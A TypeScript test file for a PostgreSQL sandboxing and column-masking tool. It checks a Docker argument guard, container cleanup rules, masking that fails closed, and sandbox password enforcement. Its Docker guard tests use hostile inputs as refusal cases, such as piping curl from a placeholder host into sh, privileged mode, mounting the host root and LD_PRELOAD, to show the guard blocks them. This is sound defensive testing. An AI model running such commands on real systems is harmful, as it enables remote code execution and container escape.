import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { Guard, GuardError, hostId, newToken } from '../src/guard.js';
import {
  DockerGuardError,
  checkDockerArgs,
  containerNameFor,
  removableContainer,
  LABEL_HOST,
  LABEL_KEY,
  LABEL_PID,
  LABEL_TOKEN,
  RELAY_SCRIPT
} from '../src/docker.js';
import { applyMasks, maskText, parseMask, scrambleExpr, validateMasks } from '../src/mask.js';
import { discoverBuildFiles, pgCronHint } from '../src/files.js';
import { modeLines, policyDifferences, sandboxImageFor } from '../src/run.js';
import { PASSWORDLESS_RULES_SQL, assertAuthEnforced, assertNoPasswordlessHostRules, containerHostFor, dumpEnvFor, rolesScript } from '../src/sandbox.js';
import type { Db } from '../src/guard.js';
import type { Policy } from '../src/types.js';

// ---------------------------------------------------------------- guard: the empty master

describe('guard: build mode', () => {
  const url = 'postgres://u:p@127.0.0.1:5432/appdb';
  it('empty-master: the guard refuses a master made from template0 unless build mode is on', () => {
    const off = new Guard({ sourceUrl: url, allowTerminate: false });
    const on = new Guard({ sourceUrl: url, allowTerminate: false, emptyMaster: true });
    const sql = (g: Guard): string => `create database "${g.masterName()}" template "template0"`;
    expect(() => off.check('admin', sql(off))).toThrow(GuardError);
    expect(() => on.check('admin', sql(on))).not.toThrow();
  });
  it('empty-master: build mode allows template0 for the master only, and no other template', () => {
    const g = new Guard({ sourceUrl: url, allowTerminate: false, emptyMaster: true });
    expect(() => g.check('admin', `create database "${g.masterName()}" template "template1"`)).toThrow(GuardError);
    expect(() => g.check('admin', `create database "${g.masterName()}" template "other"`)).toThrow(GuardError);
    // A per-break copy may not come from template0, even in build mode.
    expect(() => g.check('admin', `create database "${g.copyName(1)}" template "template0"`)).toThrow(GuardError);
    // The master is still allowed from the source in default mode.
    const d = new Guard({ sourceUrl: url, allowTerminate: false });
    expect(() => d.check('admin', `create database "${d.masterName()}" template "appdb"`)).not.toThrow();
  });
});

// ---------------------------------------------------------------- docker guard

describe('docker guard', () => {
  const token = newToken();
  const name = containerNameFor(hostId(), process.pid, token);
  const labels = ['--label', `${LABEL_KEY}=1`, '--label', `${LABEL_HOST}=${hostId()}`, '--label', `${LABEL_PID}=${process.pid}`, '--label', `${LABEL_TOKEN}=${token}`];
  const runArgs = (extra: string[] = [], image = 'postgres:17'): string[] => [
    'run', '-d', '--rm', '--name', name, ...labels, '-e', 'POSTGRES_PASSWORD', '-e', 'POSTGRES_INITDB_ARGS', '-p', '127.0.0.1::5432', '--add-host', 'host.docker.internal:host-gateway', image, ...extra
  ];
  it('docker guard: allows the one container shape the tool starts', () => {
    expect(() => checkDockerArgs(runArgs(), name)).not.toThrow();
    expect(() => checkDockerArgs(['port', name, '5432/tcp'], name)).not.toThrow();
    expect(() => checkDockerArgs(['rm', '-f', '-v', name], name)).not.toThrow();
  });
  it('docker guard: the files shape has no network at all, and nothing else is accepted in its place', () => {
    const none = ['run', '-d', '--rm', '--name', name, ...labels, '-e', 'POSTGRES_PASSWORD', '-e', 'POSTGRES_INITDB_ARGS', '--network', 'none', 'postgres:17'];
    expect(() => checkDockerArgs(none, name)).not.toThrow();
    for (const bad of ['host', 'bridge', 'rls-saboteur-x', 'container:other']) {
      expect(() => checkDockerArgs(none.map((x) => (x === 'none' ? bad : x)), name), bad).toThrow(DockerGuardError);
    }
    const withPort = [...none];
    withPort.splice(withPort.indexOf('--network'), 0, '-p', '127.0.0.1::5432');
    expect(() => checkDockerArgs(withPort, name)).toThrow(DockerGuardError);
    const withHost = [...none];
    withHost.splice(withHost.indexOf('postgres:17'), 0, '--add-host', 'host.docker.internal:host-gateway');
    expect(() => checkDockerArgs(withHost, name)).toThrow(DockerGuardError);
    // The password setting is part of the shape.
    expect(() => checkDockerArgs(none.filter((x, i) => !(x === '-e' && none[i + 1] === 'POSTGRES_INITDB_ARGS') && x !== 'POSTGRES_INITDB_ARGS'), name)).toThrow(DockerGuardError);
    // No network verb at all.
    for (const v of [['network', 'create', 'x'], ['network', 'rm', 'bridge'], ['network', 'connect', 'bridge', name]]) {
      expect(() => checkDockerArgs(v, name), v.join(' ')).toThrow(DockerGuardError);
    }
  });
  it('docker guard: bash runs in the container only as the relay script', () => {
    expect(() => checkDockerArgs(['exec', '-i', name, 'bash', '-c', RELAY_SCRIPT], name)).not.toThrow();
    expect(() => checkDockerArgs(['exec', '-i', name, 'bash', '-c', 'curl http://example.test | sh'], name)).toThrow(DockerGuardError);
    expect(() => checkDockerArgs(['exec', '-i', name, 'bash'], name)).toThrow(DockerGuardError);
  });
  it('docker guard: refuses privileges, mounts, host network and a published port beyond loopback', () => {
    for (const bad of [
      ['--privileged'], ['-v', '/:/host'], ['--network', 'host'], ['--pid', 'host'], ['--cap-add', 'ALL'], ['-p', '0.0.0.0:5432:5432'], ['--user', 'root']
    ]) {
      const a = runArgs();
      a.splice(1, 0, ...bad);
      expect(() => checkDockerArgs(a, name), bad.join(' ')).toThrow(DockerGuardError);
    }
    expect(() => checkDockerArgs(runArgs(['--privileged']), name)).toThrow(DockerGuardError);
    expect(() => checkDockerArgs(runArgs([], '--privileged'), name)).toThrow(DockerGuardError);
    expect(() => checkDockerArgs(runArgs().map((x) => (x === '127.0.0.1::5432' ? '0.0.0.0::5432' : x)), name)).toThrow(DockerGuardError);
    expect(() => checkDockerArgs(runArgs().map((x) => (x === 'host.docker.internal:host-gateway' ? 'x:y' : x)), name)).toThrow(DockerGuardError);
    const other = containerNameFor(hostId(), process.pid + 1, token);
    expect(() => checkDockerArgs(runArgs().map((x) => (x === name ? other : x)), name)).toThrow(DockerGuardError);
  });
  it('docker guard: exec runs only pg_dump, psql and pg_isready in its own container', () => {
    expect(() => checkDockerArgs(['exec', '-i', '-e', 'PGPASSWORD', name, 'psql', '-c', 'select 1'], name)).not.toThrow();
    expect(() => checkDockerArgs(['exec', name, 'sh', '-c', 'id'], name)).toThrow(DockerGuardError);
    expect(() => checkDockerArgs(['exec', name, 'bash'], name)).toThrow(DockerGuardError);
    expect(() => checkDockerArgs(['exec', '-e', 'LD_PRELOAD', name, 'psql'], name)).toThrow(DockerGuardError);
    expect(() => checkDockerArgs(['exec', 'some-other-container', 'psql'], name)).toThrow(DockerGuardError);
  });
  it('docker guard: refuses every other verb, and a removal of a name that is not the tool\'s', () => {
    for (const v of [['kill', name], ['stop', name], ['cp', name, '/tmp'], ['network', 'rm', 'bridge'], ['volume', 'rm', 'x'], ['system', 'prune', '-f'], ['image', 'rm', 'postgres']]) {
      expect(() => checkDockerArgs(v, name), v.join(' ')).toThrow(DockerGuardError);
    }
    expect(() => checkDockerArgs(['rm', '-f', '-v', 'supabase_db_x'], name)).toThrow(DockerGuardError);
    expect(() => checkDockerArgs(['rm', '-f', 'supabase_db_x'], name)).toThrow(DockerGuardError);
  });
});

describe('removableContainer (the one rule behind every container removal)', () => {
  const host = 'aaaaaaaaaaaa';
  const token = 'b'.repeat(16);
  const mk = (h: string, pid: number, t: string) => {
    const n = containerNameFor(h, pid, t);
    return { n, l: { [LABEL_KEY]: '1', [LABEL_HOST]: h, [LABEL_PID]: String(pid), [LABEL_TOKEN]: t } };
  };
  it('removes a container of this run', () => {
    const c = mk(host, 10, token);
    expect(removableContainer(c.n, c.l, token, () => true, host).ok).toBe(true);
  });
  it('removes a container of a dead process of this host', () => {
    const c = mk(host, 10, 'c'.repeat(16));
    expect(removableContainer(c.n, c.l, token, () => false, host).ok).toBe(true);
  });
  it('never removes a container of a live process, of another host, or without the tool\'s labels', () => {
    const live = mk(host, 10, 'c'.repeat(16));
    expect(removableContainer(live.n, live.l, token, () => true, host).ok).toBe(false);
    const foreign = mk('dddddddddddd', 10, 'c'.repeat(16));
    expect(removableContainer(foreign.n, foreign.l, token, () => false, host).ok).toBe(false);
    const c = mk(host, 10, 'c'.repeat(16));
    expect(removableContainer(c.n, {}, token, () => false, host).ok).toBe(false);
    expect(removableContainer(c.n, { ...c.l, [LABEL_PID]: '11' }, token, () => false, host).ok).toBe(false);
    expect(removableContainer('supabase_db_x', c.l, token, () => false, host).ok).toBe(false);
  });
});

// ---------------------------------------------------------------- masks

describe('mask: parsing', () => {
  it('reads schema.table.column with the default and the null strategy', () => {
    expect(parseMask('public.users.email')).toEqual({ schema: 'public', table: 'users', column: 'email', strategy: 'scramble' });
    expect(parseMask('public.users.note=null').strategy).toBe('null');
    expect(parseMask('"my schema"."T.1".c').table).toBe('T.1');
    expect(maskText(parseMask('a.b.c=null'))).toBe('a.b.c=null');
  });
  it('rejects anything else', () => {
    for (const bad of ['', 'users.email', 'a.b', 'a.b.c.d', 'a.b.c=hash', 'a.b.c=', 'a.b.c extra']) {
      expect(() => parseMask(bad), bad).toThrow(/--mask/);
    }
  });
  it('scramble expressions match the column type, and an unknown type has none', () => {
    expect(scrambleExpr('"c"', { base: 'varchar', type: 'character varying(8)', maxLen: 8 }, 'ab')).toContain('left(md5');
    expect(scrambleExpr('"c"', { base: 'varchar', type: 'character varying(8)', maxLen: 8 }, 'ab')).toContain(', 8)');
    expect(scrambleExpr('"c"', { base: 'uuid', type: 'uuid', maxLen: null }, 'ab')).toContain('::uuid');
    expect(scrambleExpr('"c"', { base: 'int4', type: 'integer', maxLen: null }, 'ab')).toContain('% 2147483647');
    expect(() => scrambleExpr('"c"', { base: 'jsonb', type: 'jsonb', maxLen: null }, 'ab')).toThrow();
  });
});

/** A fake database that answers the mask queries. `s` controls what it says. */
function fakeDb(s: { exists?: boolean; type?: string; before?: number; updated?: number; left?: number; noSuper?: boolean; statsLeft?: number; parents?: string[]; outside?: { member: string; outside_parent: string }[]; copiers?: string[]; fkPairs?: { fk_child: string; fk_parent: string }[]; tree?: { schema: string; name: string; kind: string }[]; relkind?: string; generated?: string }): { db: Db; log: string[] } {
  const log: string[] = [];
  const db: Db = {
    async end() {},
    async query(text: string, v?: unknown[]) {
      log.push(text.replace(/\s+/g, ' ').trim());
      if (/from pg_attribute a/.test(text)) {
        if (s.exists === false) return { rows: [], rowCount: 0 } as never;
        return { rows: [{ relkind: s.relkind ?? 'r', type: s.type ?? 'text', base: s.type ?? 'text', generated: s.generated ?? '', identity: '', maxlen: null }], rowCount: 1 } as never;
      }
      if (/as outside_parent/.test(text)) return { rows: s.outside ?? [], rowCount: 0 } as never;
      if (/as fk_child/.test(text)) return { rows: s.fkPairs ?? [], rowCount: 0 } as never;
      if (/as what/.test(text)) return { rows: (s.copiers ?? []).map((what) => ({ what })), rowCount: 0 } as never;
      if (/as parent\s+from pg_inherits/.test(text)) return { rows: (s.parents ?? []).map((parent) => ({ parent })), rowCount: 0 } as never;
      if (/with recursive t as/.test(text)) return { rows: s.tree ?? [{ schema: String(v?.[0] ?? 'public'), name: String(v?.[1] ?? 'users'), kind: 'r' }], rowCount: 1 } as never;
      if (/from pg_stats s/.test(text)) return { rows: [{ n: s.statsLeft ?? 0 }], rowCount: 1 } as never;
      if (/session_replication_role/.test(text) && s.noSuper) throw new Error('permission denied to set parameter');
      if (/select count\(\*\) as n from _sab_mask/.test(text)) return { rows: [{ n: s.before ?? 3 }], rowCount: 1 } as never;
      if (/^update /.test(text.trim())) return { rows: [], rowCount: s.updated ?? s.before ?? 3 } as never;
      if (/select count\(\*\) as n from/.test(text)) return { rows: [{ n: s.left ?? 0 }], rowCount: 1 } as never;
      return { rows: [], rowCount: 0 } as never;
    }
  };
  return { db, log };
}

describe('mask: it fails closed', () => {
  const spec = [parseMask('public.users.email')];
  it('mask-ok: a clean rewrite is committed and counted', async () => {
    const { db, log } = fakeDb({});
    const out = await applyMasks(db, spec, 'salt');
    expect(out).toEqual([{ column: 'public.users.email', strategy: 'scramble', rows: 3 }]);
    expect(log).toContain('commit');
    expect(log.findIndex((l) => /^update/.test(l))).toBeGreaterThan(log.indexOf('begin'));
    expect(log.some((l) => /row_security = off/.test(l))).toBe(true);
    // After the commit: rewrite the table (dead rows, indexes) and rebuild the statistics, then look at them.
    const commit = log.indexOf('commit');
    expect(log.findIndex((l) => /^vacuum \(full, analyze\)/.test(l))).toBeGreaterThan(commit);
    expect(log.findIndex((l) => /from pg_stats s/.test(l))).toBeGreaterThan(log.findIndex((l) => /^vacuum/.test(l)));
    expect(log.filter((l) => /^vacuum \(full, analyze\)/.test(l))).toEqual(['vacuum (full, analyze) "public"."users"']);
    expect(log).toContain('vacuum (full) pg_catalog.pg_statistic');
    expect(log).toContain('vacuum (full) pg_catalog.pg_statistic_ext_data');
  });
  it('mask-inherit: every table below the masked one is vacuumed and has its statistics checked', async () => {
    const tree = [
      { schema: 'public', name: 'parent', kind: 'r' },
      { schema: 'public', name: 'child', kind: 'r' },
      { schema: 'public', name: 'pt', kind: 'p' },
      { schema: 'public', name: 'pt1', kind: 'r' }
    ];
    const { db, log } = fakeDb({ tree });
    await applyMasks(db, [parseMask('public.parent.email')], 's');
    expect(log).toContain('vacuum (full, analyze) "public"."parent"');
    expect(log).toContain('vacuum (full, analyze) "public"."child"');
    expect(log).toContain('analyze "public"."pt"');
    expect(log).toContain('vacuum (full, analyze) "public"."pt1"');
    expect(log.filter((l) => /from pg_stats s/.test(l))).toHaveLength(4);
  });
  it('mask-inherit: an original value in the statistics of a child stops the run', async () => {
    const tree = [{ schema: 'public', name: 'parent', kind: 'r' }, { schema: 'public', name: 'child', kind: 'r' }];
    let call = 0;
    const base = fakeDb({ tree });
    const db: Db = {
      end: base.db.end,
      query: async (text: string, v?: unknown[]) => {
        if (/from pg_stats s/.test(text)) return { rows: [{ n: v?.[1] === 'child' ? 3 : 0 }], rowCount: 1 } as never;
        call++;
        return base.db.query(text, v);
      }
    };
    await expect(applyMasks(db, [parseMask('public.parent.email')], 's')).rejects.toThrow(/planner statistics of public\.child/);
    expect(call).toBeGreaterThan(0);
  });
  it('mask-inherit: a table that has a parent cannot be masked on its own, and the plan check says so', async () => {
    const { db, log } = fakeDb({ parents: ['public.parent'] });
    await expect(applyMasks(db, [parseMask('public.child.email')], 's')).rejects.toThrow(/inherits from public\.parent.*Mask email on public\.parent/);
    expect(log.some((l) => /^update/.test(l))).toBe(false);
    expect((await validateMasks(fakeDb({ parents: ['public.parent'] }).db, [parseMask('public.child.email')]))[0]).toMatch(/inherits from public\.parent/);
  });
  it('mask-inherit: a member with a parent outside the tree stops the run', async () => {
    const { db, log } = fakeDb({ outside: [{ member: 'public.ch', outside_parent: 'public.pb' }] });
    await expect(applyMasks(db, [parseMask('public.pa.email')], 's')).rejects.toThrow(/public\.ch also inherits from public\.pb, which is outside the tree of public\.pa/);
    expect(log.some((l) => /^update/.test(l))).toBe(false);
    expect((await validateMasks(fakeDb({ outside: [{ member: 'public.ch', outside_parent: 'public.pb' }] }).db, [parseMask('public.pa.email')]))[0]).toMatch(/outside the tree/);
  });
  it('mask-fk: a column tied to the masked one by a foreign key must be masked in the same run', async () => {
    const pairs = [{ fk_child: 'public.orders.buyer_email', fk_parent: 'public.users.email' }];
    const { db, log } = fakeDb({ fkPairs: pairs });
    await expect(applyMasks(db, [parseMask('public.users.email')], 's')).rejects.toThrow(/public\.orders\.buyer_email is tied to public\.users\.email by a foreign key/);
    expect(log.some((l) => /^update/.test(l))).toBe(false);
    // Named in the same run: allowed.
    await expect(applyMasks(fakeDb({ fkPairs: pairs }).db, [parseMask('public.users.email'), parseMask('public.orders.buyer_email')], 's')).resolves.toHaveLength(2);
  });
  it('mask-fk-reverse: a masked column that references another column needs that column masked too', async () => {
    const pairs = [{ fk_child: 'public.contacts.person_email', fk_parent: 'public.people.email' }];
    const { db, log } = fakeDb({ fkPairs: pairs });
    await expect(applyMasks(db, [parseMask('public.contacts.person_email')], 's')).rejects.toThrow(/public\.people\.email is tied to public\.contacts\.person_email by a foreign key/);
    expect(log.some((l) => /^update/.test(l))).toBe(false);
    await expect(applyMasks(fakeDb({ fkPairs: pairs }).db, [parseMask('public.contacts.person_email'), parseMask('public.people.email')], 's')).resolves.toHaveLength(2);
  });
  it('mask-fk-chain: a chain of keys is followed in both directions, and a column below a masked table counts as masked', async () => {
    const pairs = [
      { fk_child: 'public.b.x', fk_parent: 'public.a.x' },
      { fk_child: 'public.c.x', fk_parent: 'public.b.x' },
      { fk_child: 'public.a.x', fk_parent: 'public.root.x' }
    ];
    // Masking b.x alone reaches a.x, c.x and, through a.x, root.x.
    await expect(applyMasks(fakeDb({ fkPairs: pairs }).db, [parseMask('public.b.x')], 's')).rejects.toThrow(
      /public\.a\.x is tied to public\.b\.x.*public\.c\.x is tied to public\.b\.x.*public\.root\.x is tied to public\.a\.x/
    );
    // One link left out is still refused.
    await expect(applyMasks(fakeDb({ fkPairs: pairs }).db, ['public.b.x', 'public.a.x', 'public.c.x'].map(parseMask), 's')).rejects.toThrow(/public\.root\.x is tied to public\.a\.x/);
    await expect(applyMasks(fakeDb({ fkPairs: pairs }).db, ['public.b.x', 'public.a.x', 'public.c.x', 'public.root.x'].map(parseMask), 's')).resolves.toHaveLength(4);
    // Everything is checked before the first rewrite.
    const { db, log } = fakeDb({ fkPairs: pairs });
    await expect(applyMasks(db, ['public.b.x', 'public.a.x'].map(parseMask), 's')).rejects.toThrow();
    expect(log.some((l) => /^update/.test(l))).toBe(false);
  });
  it('mask-copiers: an update rule or a materialized view over the table stops the run', async () => {
    const { db, log } = fakeDb({ copiers: ['materialized view public.people_mv'] });
    await expect(applyMasks(db, [parseMask('public.people.email')], 's')).rejects.toThrow(/materialized view public\.people_mv would keep a copy/);
    expect(log.some((l) => /^update/.test(l))).toBe(false);
  });
  it('mask-inherit: a foreign table below the masked one stops the run before anything is rewritten', async () => {
    const { db, log } = fakeDb({ tree: [{ schema: 'public', name: 'parent', kind: 'r' }, { schema: 'public', name: 'remote', kind: 'f' }] });
    await expect(applyMasks(db, [parseMask('public.parent.email')], 's')).rejects.toThrow(/public\.remote \(relkind f\)/);
    expect(log.some((l) => /^update/.test(l))).toBe(false);
  });
  it('mask-stats: an original value still in the planner statistics stops the run', async () => {
    await expect(applyMasks(fakeDb({ statsLeft: 2 }).db, spec, 's')).rejects.toThrow(/2 original value\(s\).*planner statistics/);
  });
  it('mask-closed: a column that does not exist stops the run', async () => {
    await expect(applyMasks(fakeDb({ exists: false }).db, spec, 's')).rejects.toThrow(/does not exist/);
    expect(await validateMasks(fakeDb({ exists: false }).db, spec)).toEqual(['public.users.email does not exist']);
  });
  it('mask-closed: a row that was not rewritten stops the run and rolls back', async () => {
    const { db, log } = fakeDb({ before: 3, updated: 2 });
    await expect(applyMasks(db, spec, 's')).rejects.toThrow(/rewrote 2 row\(s\).*expected 3/);
    expect(log).toContain('rollback');
    expect(log).not.toContain('commit');
  });
  it('mask-closed: an original value that survives stops the run and rolls back', async () => {
    const { db, log } = fakeDb({ left: 1 });
    await expect(applyMasks(db, spec, 's')).rejects.toThrow(/still hold an original value/);
    expect(log).toContain('rollback');
    expect(log).not.toContain('commit');
  });
  it('mask-closed: a role that cannot switch triggers off stops the run', async () => {
    await expect(applyMasks(fakeDb({ noSuper: true }).db, spec, 's')).rejects.toThrow(/needs a superuser/);
  });
  it('mask-closed: a type scramble cannot handle, a view and a generated column stop the run', async () => {
    await expect(applyMasks(fakeDb({ type: 'jsonb' }).db, spec, 's')).rejects.toThrow(/does not handle/);
    await expect(applyMasks(fakeDb({ relkind: 'v' }).db, spec, 's')).rejects.toThrow(/not a table/);
    await expect(applyMasks(fakeDb({ generated: 's' }).db, spec, 's')).rejects.toThrow(/generated column/);
  });
  it('mask-null: the null strategy checks that no value is left', async () => {
    const { db } = fakeDb({ left: 2 });
    await expect(applyMasks(db, [parseMask('public.users.note=null')], 's')).rejects.toThrow(/still hold an original value/);
  });
});

// ---------------------------------------------------------------- files, plan lines, helpers

describe('build files', () => {
  it('from-files: reads migrations in name order, then the seed', () => {
    const d = mkdtempSync(join(tmpdir(), 'sab-files-'));
    try {
      mkdirSync(join(d, 'supabase', 'migrations'), { recursive: true });
      writeFileSync(join(d, 'supabase', 'migrations', '2_b.sql'), 'select 2');
      writeFileSync(join(d, 'supabase', 'migrations', '1_a.sql'), 'select 1');
      writeFileSync(join(d, 'supabase', 'migrations', 'notes.txt'), 'x');
      writeFileSync(join(d, 'supabase', 'seed.sql'), 'select 3');
      const f = discoverBuildFiles(d);
      expect(f.migrations.map((m) => m.split('/').pop())).toEqual(['1_a.sql', '2_b.sql']);
      expect(f.seed).toMatch(/seed\.sql$/);
    } finally {
      rmSync(d, { recursive: true, force: true });
    }
  });
  it('from-files: a missing directory, no migration, or a named seed that is missing is an error', () => {
    const d = mkdtempSync(join(tmpdir(), 'sab-files-'));
    try {
      expect(() => discoverBuildFiles(d)).toThrow(/does not exist/);
      mkdirSync(join(d, 'supabase', 'migrations'), { recursive: true });
      expect(() => discoverBuildFiles(d)).toThrow(/no .sql file/);
      writeFileSync(join(d, 'supabase', 'migrations', '1.sql'), 'select 1');
      expect(discoverBuildFiles(d).seed).toBeNull();
      expect(() => discoverBuildFiles(d, undefined, 'nope.sql')).toThrow(/seed file/);
    } finally {
      rmSync(d, { recursive: true, force: true });
    }
  });
  it('pg_cron: the hint appears only for the pg_cron error', () => {
    expect(pgCronHint('can only create extension in database postgres')).toMatch(/cron\.database_name/);
    expect(pgCronHint('syntax error')).toBe('');
  });
});

describe('plan lines and helpers', () => {
  const pol = (name: string, qual = 'true'): Policy => ({ schema: 'public', table: 't', name, cmd: 'SELECT', permissive: true, roles: [], qual, withCheck: null });
  it('default-plan: a default run adds no plan line', () => {
    expect(modeLines({ buildFiles: null, sandbox: false, masks: [] })).toEqual([]);
    expect(modeLines({ masks: undefined })).toEqual([]);
  });
  it('plan: files mode claims an isolated network, dump mode admits the container can reach out', () => {
    const files = { migrations: ['a.sql'], seed: null, description: '1 migration file(s)' };
    expect(modeLines({ sandbox: true, buildFiles: files }).join(' ')).toMatch(/no network at all/);
    expect(modeLines({ sandbox: true }).join(' ')).toMatch(/can reach your machine and the internet/);
  });
  it('sandbox-auth: only a password refusal counts as a refusal, and both probes must be refused', async () => {
    const refuse = Object.assign(new Error('password authentication failed'), { code: '28P01' });
    const url = (u: string, pw: string, db: string): string => `postgres://${u}:${pw}@h/${db}`;
    // Both refused: pass.
    await expect(assertAuthEnforced(url, 'u', async () => { throw refuse; })).resolves.toBeUndefined();
    // A connection that works is a failure, on the first probe or on the second.
    await expect(assertAuthEnforced(url, 'u', async () => ({ end: async () => {} }))).rejects.toThrow(/lets a client in/);
    let n = 0;
    await expect(assertAuthEnforced(url, 'u', async () => { if (n++ === 0) throw refuse; return { end: async () => {} }; })).rejects.toThrow(/lets a client in.*does not exist, on another database/);
    // Any other error is not a refusal: a refused connection, a starting server, a missing database, "role does not exist".
    for (const code of [undefined, 'ECONNREFUSED', '57P03', '3D000', '28000', '42501']) {
      const other = Object.assign(new Error('some other failure'), { code });
      await expect(assertAuthEnforced(url, 'u', async () => { throw other; }), String(code)).rejects.toThrow(/could not check that the sandbox asks for a password/);
    }
    // The probes: the right user on postgres, and a random user that is not the real one on template1, each with a random wrong password.
    const seen: { u: string; pw: string; db: string }[] = [];
    await assertAuthEnforced((u, pw, db) => { seen.push({ u, pw, db }); return url(u, pw, db); }, 'sup', async () => { throw refuse; });
    expect(seen.map((x) => x.db)).toEqual(['postgres', 'template1']);
    expect(seen[0].u).toBe('sup');
    expect(seen[1].u).toMatch(/^nobody_[0-9a-f]{12}$/);
    expect(seen.every((x) => /^wrong-[0-9a-f]{16}$/.test(x.pw))).toBe(true);
  });
  it('sandbox-auth-rules: a host rule that needs no password stops the run', async () => {
    await expect(assertNoPasswordlessHostRules(async () => ({ rows: [] }))).resolves.toBeUndefined();
    await expect(
      assertNoPasswordlessHostRules(async () => ({ rows: [{ line_number: 3, type: 'host', database: '{template1}', user_name: '{all}', address: 'all', auth_method: 'trust' }] }))
    ).rejects.toThrow(/1 host rule\(s\) that need no password \(line 3: host \{template1\}/);
    // The query asks for host rules whose method is not a password method (and "reject" is fine).
    expect(PASSWORDLESS_RULES_SQL).toMatch(/type like 'host%'/);
    expect(PASSWORDLESS_RULES_SQL).toMatch(/not in \('scram-sha-256', 'md5', 'password', 'reject'\)/);
  });
  it('plan: files mode claims an isolated network, dump mode admits the container can reach out', () => {
    const files = { migrations: ['a.sql'], seed: null, description: '1 migration file(s)' };
    expect(modeLines({ sandbox: true, buildFiles: files }).join(' ')).toMatch(/no network at all/);
    expect(modeLines({ sandbox: true }).join(' ')).toMatch(/can reach your machine and the internet/);
  });
  it('plan: the new modes say what they do', () => {
    const files = { migrations: ['a.sql'], seed: null, description: '1 migration file(s)' };
    expect(modeLines({ buildFiles: files }).join(' ')).toMatch(/No row of this database is copied/);
    expect(modeLines({ sandbox: true }).join(' ')).toMatch(/pg_dump runs in it/);
    expect(modeLines({ sandbox: true, buildFiles: files }).join(' ')).not.toMatch(/pg_dump runs/);
    expect(modeLines({ masks: [parseMask('a.b.c')] }).join(' ')).toMatch(/If one cannot be, the run stops/);
  });
  it('policyDifferences names a policy that is missing, extra or different', () => {
    expect(policyDifferences([pol('a')], [pol('a')])).toEqual([]);
    expect(policyDifferences([pol('a')], [])).toHaveLength(1);
    expect(policyDifferences([], [pol('a')])).toHaveLength(1);
    expect(policyDifferences([pol('a', 'true')], [pol('a', 'false')])).toHaveLength(1);
  });
  it('sandbox image defaults to the official image of the source major version', () => {
    const f = { version: '17.6', addr: null, port: null, sizeBytes: 0, sizePretty: '', sessions: [] };
    expect(sandboxImageFor({}, f)).toBe('postgres:17');
    expect(sandboxImageFor({ sandboxImage: 'x/y:1' }, f)).toBe('x/y:1');
  });
  it('sandbox: only loopback source hosts are rewritten to the Docker host name', () => {
    expect(containerHostFor('127.0.0.1')).toBe('host.docker.internal');
    expect(containerHostFor('localhost')).toBe('host.docker.internal');
    expect(containerHostFor('supabase_db_x')).toBe('supabase_db_x');
  });
  it('sandbox-dump-readonly: the dump session asks the server to refuse writes, and names the container host', () => {
    const e = dumpEnvFor('postgres://me:s%40cret@127.0.0.1:5432/app');
    expect(e.PGOPTIONS).toBe('-c default_transaction_read_only=on');
    expect(e.PGHOST).toBe('host.docker.internal');
    expect(e.PGPASSWORD).toBe('s@cret');
    expect(e.PGDATABASE).toBe('app');
  });
  it('sandbox roles script: no superuser, no password, system roles skipped', () => {
    const base = { rolinherit: true, rolcreaterole: false, rolcreatedb: false, rolcanlogin: false, rolreplication: false, rolbypassrls: false };
    const sql = rolesScript([{ rolname: 'app_user', ...base }, { rolname: 'pg_monitor', ...base }, { rolname: 'postgres', ...base }, { rolname: "o'q", ...base, rolcanlogin: true }], [{ role: 'app_user', member: "o'q" }], 'postgres');
    expect(sql).toContain('create role "app_user" NOSUPERUSER');
    expect(sql).not.toMatch(/pg_monitor|"postgres"/);
    expect(sql).not.toMatch(/(?<!NO)SUPERUSER|password/i);
    expect(sql).toContain(`'o''q'`);
    expect(sql).toContain('grant "app_user" to "o\'q"');
  });
  it('sandbox-role-names: a name with $, a backslash or a line break is refused, and the tag changes every time', () => {
    const base = { rolinherit: true, rolcreaterole: false, rolcreatedb: false, rolcanlogin: false, rolreplication: false, rolbypassrls: false };
    for (const bad of ['x$sab$y', 'a\\b', 'a\nb', 'a\rb', 'a\u2028b', 'a\u0000b']) {
      expect(() => rolesScript([{ rolname: bad, ...base }], [], 'postgres'), JSON.stringify(bad)).toThrow(/does not copy such names/);
      expect(() => rolesScript([{ rolname: 'ok', ...base }], [{ role: 'ok', member: bad }], 'postgres'), JSON.stringify(bad)).toThrow(/does not copy such names/);
    }
    const one = rolesScript([{ rolname: 'ok', ...base }], [], 'postgres');
    const two = rolesScript([{ rolname: 'ok', ...base }], [], 'postgres');
    expect(/\$(sab[0-9a-f]{16})\$/.exec(one)![1]).not.toBe(/\$(sab[0-9a-f]{16})\$/.exec(two)![1]);
  });
});
